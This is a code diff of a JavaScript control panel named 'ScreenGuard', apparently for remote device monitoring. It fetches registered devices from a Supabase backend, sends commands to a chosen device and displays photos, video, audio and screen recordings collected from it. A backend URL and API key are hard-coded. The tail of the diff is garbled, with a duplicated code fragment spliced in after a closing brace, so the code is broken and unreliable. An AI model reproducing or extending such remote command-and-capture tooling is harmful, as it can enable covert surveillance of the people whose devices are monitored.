@@ -1,5 +1,5 @@
 // ============================================
-// SCREENGUARD PANEL (Direct Fetch)
+// SCREENGUARD PANEL
 // ============================================
 
 const SUPABASE_URL = "https://weyfoshcpyqjbcmpxrqq.supabase.co";
@@ -8,17 +8,28 @@ const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBh
 let currentDeviceKey = null;
 
 // ============================================
-// HELPERS
+// API HEADERS
 // ============================================
 
-function apiHeaders() {
+function getHeaders() {
+    return {
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
+    };
+}
+
+function postHeaders() {
     return {
         'apikey': SUPABASE_ANON_KEY,
         'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
         'Content-Type': 'application/json',
-        'Prefer': 'return=representation'
+        'Prefer': 'return=minimal'
     };
 }
+
+// ============================================
+// HELPERS
+// ============================================
 
 function timeAgo(ts) {
     if (!ts) return '—';
@@ -37,6 +48,14 @@ function escapeHtml(str) {
     }[c]));
 }
 
+function setBanner(text, color) {
+    const b = document.getElementById('debugInfo');
+    if (b) {
+        b.style.background = color;
+        b.textContent = text;
+    }
+}
+
 function toast(msg, type) {
     const el = document.getElementById('toast');
     if (!el) return;
@@ -47,23 +66,6 @@ function toast(msg, type) {
     window._toastTimer = setTimeout(() => el.classList.add('hidden'), 3000);
 }
 
-function showError(msg) {
-    const banner = document.getElementById('debugInfo');
-    if (banner) {
-        banner.style.background = '#EF4444';
-        banner.textContent = '❌ ' + msg;
-    }
-    console.error('[Error]', msg);
-}
-
-function showSuccess(msg) {
-    const banner = document.getElementById('debugInfo');
-    if (banner) {
-        banner.style.background = '#10B981';
-        banner.textContent = '✓ ' + msg;
-    }
-}
-
 // ============================================
 // INIT
 // ============================================
@@ -71,7 +73,6 @@ function showSuccess(msg) {
 document.addEventListener('DOMContentLoaded', () => {
     console.log('[Panel] Loading...');
 
-    // Setup listeners
     const refreshBtn = document.getElementById('refreshBtn');
     if (refreshBtn) refreshBtn.addEventListener('click', () => location.reload());
 
@@ -85,42 +86,8 @@ document.addEventListener('DOMContentLoaded', () => {
         btn.addEventListener('click', () => sendCommand(btn, btn.dataset.cmd));
     });
 
-    // Test connection then load devices
-    testConnection().then(ok => {
-        if (ok) {
-            showSuccess('Connected to Supabase');
-            loadDevices();
-        }
-    });
+    loadDevices();
 });
-
-// ============================================
-// CONNECTION TEST
-// ============================================
-
-async function testConnection() {
-    try {
-        const url = SUPABASE_URL + '/rest/v1/devices?select=id&limit=1';
-        console.log('[Test] Fetching:', url);
-
-        const res = await fetch(url, { headers: apiHeaders() });
-        console.log('[Test] Status:', res.status);
-
-        if (!res.ok) {
-            const errText = await res.text();
-            showError('HTTP ' + res.status + ': ' + errText.substring(0, 100));
-            return false;
-        }
-
-        const data = await res.json();
-        console.log('[Test] Response:', data);
-        return true;
-    } catch (e) {
-        console.error('[Test] Failed:', e);
-        showError('Connection failed: ' + e.message);
-        return false;
-    }
-}
 
 // ============================================
 // DEVICES
@@ -129,26 +96,31 @@ async function testConnection() {
 async function loadDevices() {
     const list = document.getElementById('devicesList');
     if (!list) return;
+
     list.innerHTML = '<div class="loading">Loading devices...</div>';
+    setBanner('Fetching devices...', '#F59E0B');
 
     try {
         const url = SUPABASE_URL + '/rest/v1/devices?select=*&order=last_seen.desc';
-        console.log('[Devices] Fetching:', url);
+        console.log('[Devices] URL:', url);
 
-        const res = await fetch(url, { headers: apiHeaders() });
+        const res = await fetch(url, { headers: getHeaders() });
         console.log('[Devices] Status:', res.status);
 
         if (!res.ok) {
-            const errText = await res.text();
-            list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '<br><small>' + escapeHtml(errText.substring(0, 200)) + '</small></div>';
+            const t = await res.text();
+            setBanner('❌ HTTP ' + res.status, '#EF4444');
+            list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '<br><small>' + escapeHtml(t.substring(0, 200)) + '</small></div>';
             return;
         }
 
         const data = await res.json();
         console.log('[Devices] Data:', data);
 
+        setBanner('✓ ' + data.length + ' device(s) loaded', '#10B981');
+
         if (!data || data.length === 0) {
-            list.innerHTML = '<div class="empty">📭 Koi device nahi<br><small>App install karke setup karo</small></div>';
+            list.innerHTML = '<div class="empty">📭 Koi device nahi</div>';
             return;
         }
 
@@ -177,7 +149,8 @@ async function loadDevices() {
             selectDevice(data[0].device_key, data);
         }
     } catch (e) {
-        console.error('[Devices] Error:', e);
+        console.error('[Devices]', e);
+        setBanner('❌ ' + e.message, '#EF4444');
         list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
     }
 }
@@ -233,7 +206,7 @@ async function sendCommand(btn, cmd) {
         const url = SUPABASE_URL + '/rest/v1/commands';
         const res = await fetch(url, {
             method: 'POST',
-            headers: apiHeaders(),
+            headers: postHeaders(),
             body: JSON.stringify({
                 device_key: currentDeviceKey,
                 cmd: cmd,
@@ -242,14 +215,14 @@ async function sendCommand(btn, cmd) {
         });
 
         if (!res.ok) {
-            const errText = await res.text();
-            throw new Error('HTTP ' + res.status + ': ' + errText.substring(0, 100));
+            const t = await res.text();
+            throw new Error('HTTP ' + res.status + ': ' + t.substring(0, 100));
         }
 
         toast('✓ ' + cmd + ' bheja', 'success');
         console.log('[Command] Sent:', cmd);
     } catch (e) {
-        console.error('[Command] Error:', e);
+        console.error('[Command]', e);
         toast('Fail: ' + e.message, 'error');
     }
 }
@@ -272,18 +245,14 @@ async function loadMedia() {
 
     try {
         const url = SUPABASE_URL + '/rest/v1/media?device_key=eq.' + encodeURIComponent(currentDeviceKey) + '&select=*&order=created_at.desc&limit=20';
-        console.log('[Media] Fetching:', url);
-
-        const res = await fetch(url, { headers: apiHeaders() });
+        const res = await fetch(url, { headers: getHeaders() });
 
         if (!res.ok) {
-            const errText = await res.text();
             list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '</div>';
             return;
         }
 
         const data = await res.json();
-        console.log('[Media] Data:', data);
 
         if (!data || data.length === 0) {
             list.innerHTML = '<div class="empty">Koi media nahi</div>';
@@ -294,6 +263,29 @@ async function loadMedia() {
             const mediaUrl = m.public_url || '';
             const type = m.media_type || 'photo';
             let icon = '📄';
+            if (type === 'photo') icon = '📸';
+            else if (type === 'video') icon = '🎥';
+            else if (type === 'audio') icon = '🎤';
+            else if (type === 'screen') icon = '📹';
+
+            return '<div class="media-item" data-url="' + escapeHtml(mediaUrl) + '">' +
+                '<div class="media-icon">' + icon + '</div>' +
+                '<img src="' + escapeHtml(mediaUrl) + '" loading="lazy" onerror="this.style.display=\'none\'">' +
+                '<div class="media-item-label">' +
+                '<span>' + type + '</span>' +
+                '<span>' + timeAgo(m.created_at) + '</span>' +
+                '</div>' +
+                '</div>';
+        }).join('');
+
+        list.querySelectorAll('.media-item').forEach(item => {
+            item.addEventListener('click', () => window.open(item.dataset.url, '_blank'));
+        });
+    } catch (e) {
+        console.error('[Media]', e);
+        list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
+    }
+} let icon = '📄';
             if (type === 'photo') icon = '📸';
             else if (type === 'video') icon = '🎥';
             else if (type === 'audio') icon = '🎤';
